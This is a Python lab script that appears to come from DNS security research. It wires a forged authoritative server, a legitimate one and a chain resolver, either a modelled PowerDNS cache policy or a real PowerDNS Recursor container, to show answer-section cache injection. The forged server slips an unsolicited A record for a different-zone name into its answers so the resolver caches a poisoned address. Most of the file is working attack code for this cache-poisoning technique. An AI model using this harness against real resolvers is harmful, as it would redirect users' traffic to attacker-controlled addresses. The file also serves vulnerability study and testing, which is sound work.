#!/usr/bin/env python3
"""answer_inject.py - trigger (f): answer-section cache injection (PowerDNS axis).

Lab only. The measured basis is the p5 probe
(the p5 resolver probe):

  * PowerDNS Recursor 5.1.3 and 4.9.5 CACHE the unsolicited A record for a
    DIFFERENT-ZONE owner that rides along in the ANSWER section of a forged
    successful answer - probe TTL 300 -> 297 is the cache evidence, and the
    relayed answer is sanitized (the extra RR is stored, not returned);
  * the same unsolicited owner OUT-OF-ZONE is REJECTED ("third-party name still
    resolves to the true address");
  * unbound 1.26.2/1.22.0, BIND 9.18.38/9.18.41/9.20.15, dnsmasq, Knot and
    CoreDNS REJECT both shapes;
  * unprimed, the name is NXDOMAIN / true - it only exists via the injection.

WHAT IS REAL HERE and what is a model:

  * real DNS exchanges end to end: the client queries the chain's resolver over
    UDP, the chain resolver forwards over UDP to the authorities, and the
    cache-hit answers carry real, decaying TTLs. Nothing is a table lookup;
  * the chain resolver's CACHE POLICY is the modeled part. resolver_class
    "pdns" reproduces exactly the two measured PowerDNS cells (different-zone
    accept, out-of-zone reject) and "unbound" the measured REJECT cells. It is
    labelled as a model: the acceptance claim rests on the real PowerDNS
    containers of matrix-2026-10-27-p5, not on this code;
  * --resolver-class pdns-docker prefers a REAL PowerDNS Recursor container
    (reusing poc/lab/dns/_recon/pdns.Dockerfile) as the chain resolver and
    falls back to the model with the reason recorded, because the chain's
    resolver must be as real as the environment allows.

No exploit payload and no malformed stream exists here: this is DNS plumbing.
"""
import shutil
import socket
import subprocess
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
ROOT = HERE.parents[1]
sys.path.insert(0, str(ROOT / "poc/vendor"))

from dnslib import DNSRecord, QTYPE, RR, A, RCODE  # noqa: E402
from dnslib.server import BaseResolver, DNSServer, DNSLogger  # noqa: E402

# The (f) fixture names follow the MEASURED p5 shape exactly: the forged answer
# is for a name in the CHILD zone, and the unsolicited A's owner is a name in
# the PARENT zone (the "different-zone owner" variant). An owner in an
# unrelated tree is the measured REJECT variant.
TREE_SUFFIX = "yes-its-a-problem.iamwonderingif.com"
PARENT_ZONE = "lab." + TREE_SUFFIX
CHILD_ZONE = "v." + TREE_SUFFIX
PRIME_NAME = "seed." + CHILD_ZONE          # the attacker's own name (child zone)
TARGET_NAME = "pay." + PARENT_ZONE         # the poisoned owner (parent zone)
OUT_OF_ZONE_NAME = "pay.netserv.lab.invalid"  # unrelated tree: measured REJECT
SEED_ADDR = "203.0.113.77"
FIXTURE_TTL = 300
POISON_ADDR = "198.51.100.66"
TRUE_ADDR = "203.0.113.10"


def zone_of(name, zones=(CHILD_ZONE, PARENT_ZONE)):
    name = name.rstrip(".").lower()
    for zone in sorted(zones, key=len, reverse=True):
        if name == zone or name.endswith("." + zone):
            return zone
    return None


def owner_kind(owner, qname, zones=(CHILD_ZONE, PARENT_ZONE)):
    """p5 variant classification: same-zone | different-zone | out-of-zone."""
    owner_zone = zone_of(owner, zones)
    qname_zone = zone_of(qname, zones)
    if owner_zone is None or qname_zone is None:
        return "out-of-zone"
    return "same-zone" if owner_zone == qname_zone else "different-zone"


class AttackerAuthority(BaseResolver):
    """The forged successful answer: its own A plus an unsolicited A for the
    target name in the ANSWER section (the p5 shape)."""

    def __init__(self, prime_name=PRIME_NAME, target_name=TARGET_NAME,
                 poison_addr=POISON_ADDR, ttl=FIXTURE_TTL):
        self.prime_name = prime_name.rstrip(".").lower()
        self.target_name = target_name.rstrip(".").lower()
        self.poison_addr = poison_addr
        self.ttl = ttl
        self.seen = []

    def resolve(self, request, handler):
        qname = str(request.q.qname).rstrip(".").lower()
        self.seen.append({"qname": qname, "at": time.time()})
        reply = request.reply()
        if qname == self.prime_name and request.q.qtype in (QTYPE.A, QTYPE.ANY):
            reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(SEED_ADDR), ttl=self.ttl))
            # The unsolicited RR: an A for a DIFFERENT-ZONE owner.
            reply.add_answer(RR(self.target_name + ".", QTYPE.A, rdata=A(self.poison_addr),
                                ttl=self.ttl))
        else:
            reply.header.rcode = RCODE.NXDOMAIN
        return reply


class ChainResolverModel(BaseResolver):
    """The chain's resolver, with its cache policy modeled on the p5 cells.

    "pdns"    stores unsolicited A records whose owner is in a DIFFERENT zone
              of the same tree (measured ACCEPT) and rejects out-of-zone owners
              (measured REJECT) and same-zone owners (UNMEASURED - t15 pending
              - so rejected conservatively). The relayed answer is sanitized:
              only the query's own owner is returned, exactly as measured.
    "unbound" stores only records whose owner is the query name (measured
              REJECT for both p5 shapes).
    """

    def __init__(self, upstreams, resolver_class="pdns", zones=(CHILD_ZONE, PARENT_ZONE)):
        self.upstreams = upstreams  # {"prime": (host, port), "clean": (host, port)}
        self.resolver_class = resolver_class
        self.zones = zones
        self.cache = {}
        self.log = []

    def _upstream_for(self, qname):
        return self.upstreams["prime"] if zone_of(qname, self.zones) == CHILD_ZONE \
            else self.upstreams.get("clean")

    def _ask(self, upstream, qname, qtype):
        if upstream is None:
            return None
        query = DNSRecord.question(qname, QTYPE[qtype])
        raw = query.send(upstream[0], upstream[1], tcp=False, timeout=5)
        return DNSRecord.parse(raw)

    def resolve(self, request, handler):
        qname = str(request.q.qname).rstrip(".").lower()
        qtype = request.q.qtype
        entry = self.cache.get((qname, qtype))
        now = time.time()
        reply = request.reply()
        if entry and entry["expires"] > now:
            remaining = max(1, int(entry["expires"] - now + 0.999))
            reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(entry["address"]), ttl=remaining))
            self.log.append({"qname": qname, "source": "cache", "ttl": remaining,
                             "ttl0": entry["ttl0"], "cached_at": entry["cached_at"]})
            return reply
        response = self._ask(self._upstream_for(qname), qname, qtype)
        if response is None:
            reply.header.rcode = RCODE.NXDOMAIN
            self.log.append({"qname": qname, "source": "nxdomain"})
            return reply
        relayed = False
        for rr in response.rr:
            if rr.rtype != QTYPE.A:
                continue
            owner = str(rr.rname).rstrip(".").lower()
            kind = "query-owner" if owner == qname else owner_kind(owner, qname, self.zones)
            accept = (owner == qname) or (self.resolver_class == "pdns" and kind == "different-zone")
            self.log.append({"qname": qname, "source": "upstream", "owner": owner,
                             "owner_kind": kind, "accepted": accept})
            if not accept:
                continue
            self.cache[(owner, QTYPE.A)] = {"address": str(rr.rdata), "ttl0": rr.ttl,
                                            "cached_at": now, "expires": now + rr.ttl}
            if owner == qname:
                reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=rr.rdata, ttl=rr.ttl))
                relayed = True
        if not relayed:
            reply.header.rcode = response.header.rcode
        return reply

    def cache_proof(self, name):
        """The TTL-decay evidence for one cached name."""
        entry = self.cache.get((name.rstrip(".").lower(), QTYPE.A))
        if not entry:
            return {"cached": False}
        return {"cached": True, "ttl0": entry["ttl0"], "cached_at": entry["cached_at"],
                "address": entry["address"]}


def start_authority(resolver, bind="127.0.0.1", port=0):
    logger = DNSLogger(log="-request,-reply,-truncated,-error")
    probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    probe.bind((bind, port))
    port = probe.getsockname()[1]
    probe.close()
    servers = [DNSServer(resolver, address=bind, port=port, tcp=tcp, logger=logger)
               for tcp in (False, True)]
    for server in servers:
        server.start_thread()
    return servers, port


def stop_servers(servers):
    for server in servers:
        try:
            server.stop()
            server.server.server_close()
        except Exception:
            pass


def start_answer_inject(resolver_class="pdns", poison_owner=TARGET_NAME, prime_name=PRIME_NAME,
                       poison_addr=POISON_ADDR, prime_delay=1.2, listen_port=0, workdir=None):
    """Wire the (f) arm: attacker authority + legit authority + chain resolver.

    Returns (chain_config, stop_fn). chain_config carries the resolver endpoint,
    the priming name, the cache-proof model handle and the backend label
    ("model:answer-inject (p5-derived)" or "pdns-recursor (docker)").
    """
    attacker = AttackerAuthority(prime_name=prime_name, target_name=poison_owner,
                                 poison_addr=poison_addr)
    attacker_servers, attacker_port = start_authority(attacker)
    legit_servers, legit_port = start_authority(
        _LegitAuthority({TARGET_NAME: TRUE_ADDR, OUT_OF_ZONE_NAME: TRUE_ADDR}))
    upstreams = {"prime": ("127.0.0.1", attacker_port), "clean": ("127.0.0.1", legit_port)}
    # The model reproduces the PowerDNS cells unless the caller asked for the
    # Unbound class; "pdns-docker" falls back to the PowerDNS model.
    model_class = "unbound" if resolver_class == "unbound" else "pdns"
    model = ChainResolverModel(upstreams, resolver_class=model_class)
    chain_servers, chain_port = start_authority(model, port=listen_port)
    backend = "model:answer-inject (p5-derived, labelled a model)"
    stop = lambda: (stop_servers(chain_servers), stop_servers(attacker_servers),
                    stop_servers(legit_servers))
    if resolver_class == "pdns-docker":
        workdir = Path(workdir) if workdir else Path(".")
        container, result = start_pdns_docker(
            chain_port, {"lab." + TREE_SUFFIX: upstreams["clean"],
                         CHILD_ZONE: upstreams["prime"]}, workdir)
        if container:
            backend = "pdns-recursor (docker container " + container[:12] + ")"
            stop = lambda: (result(), stop_servers(attacker_servers), stop_servers(legit_servers))
        else:
            backend = "model:answer-inject (docker unavailable: " + str(result) + ")"
    return {"host": "127.0.0.1", "port": chain_port, "prime_name": prime_name,
            "poison_owner": poison_owner, "prime_delay": prime_delay,
            "resolver_class": resolver_class, "backend": backend, "model": model}, stop


class _LegitAuthority(BaseResolver):
    """The legitimate operator's authority: the clean-path answers."""

    def __init__(self, names):
        self.names = {name.rstrip(".").lower(): address for name, address in names.items()}

    def resolve(self, request, handler):
        qname = str(request.q.qname).rstrip(".").lower()
        reply = request.reply()
        address = self.names.get(qname)
        if address and request.q.qtype in (QTYPE.A, QTYPE.ANY):
            reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(address), ttl=FIXTURE_TTL))
        else:
            reply.header.rcode = RCODE.NXDOMAIN
        return reply


def start_pdns_docker(listen_port, forward_zones, workdir):
    """Best effort: a REAL PowerDNS Recursor container as the chain resolver.

    Reuses the probe infra's image (poc/lab/dns/_recon/pdns.Dockerfile ->
    lab-recon/pdns). Returns (container_id, stop_fn) or (None, reason) - the
    caller falls back to the model and records the reason, because the chain
    resolver must be as real as the environment allows.
    """
    if not shutil.which("docker"):
        return None, "docker CLI not available"
    probe = subprocess.run(["docker", "info", "--format", "{{.ServerVersion}}"],
                           capture_output=True, text=True)
    if probe.returncode != 0:
        return None, "docker daemon not reachable: " + (probe.stderr or "").strip()[:120]
    image = "lab-recon/pdns"
    if subprocess.run(["docker", "image", "inspect", image], capture_output=True).returncode != 0:
        build = subprocess.run(["docker", "build", "-t", image, "-f",
                                str(ROOT / "poc/lab/dns/_recon/pdns.Dockerfile"),
                                str(ROOT / "poc/lab/dns/_recon")], capture_output=True, text=True)
        if build.returncode != 0:
            return None, "docker build failed: " + (build.stderr or "").strip()[:120]
    config = Path(workdir) / "recursor.conf"
    forwards = ",".join("%s=%s:%d" % (zone, host, port) for zone, (host, port) in forward_zones.items())
    config.write_text("daemon=no\nlocal-address=0.0.0.0\nlocal-port=53\n"
                      "allow-from=0.0.0.0/0,::/0\ndnssec=off\nquiet=no\nwebserver=no\n"
                      "socket-dir=/var/run/pdns-recursor\nforward-zones=%s\n" % forwards)
    run = subprocess.run(["docker", "run", "-d", "--rm", "--add-host", "host.docker.internal:host-gateway",
                          "-p", "127.0.0.1:%d:53/udp" % listen_port,
                          "-v", "%s:/etc/pdns/recursor.conf:ro" % config, image,
                          "sh", "-c", "mkdir -p /var/run/pdns-recursor && chown recursor "
                                      "/var/run/pdns-recursor; exec pdns_recursor --daemon=no "
                                      "--config-dir=/etc/pdns"],
                         capture_output=True, text=True)
    if run.returncode != 0:
        return None, "docker run failed: " + (run.stderr or "").strip()[:120]
    container = run.stdout.strip()
    return container, (lambda: subprocess.run(["docker", "stop", container],
                                              capture_output=True, text=True))
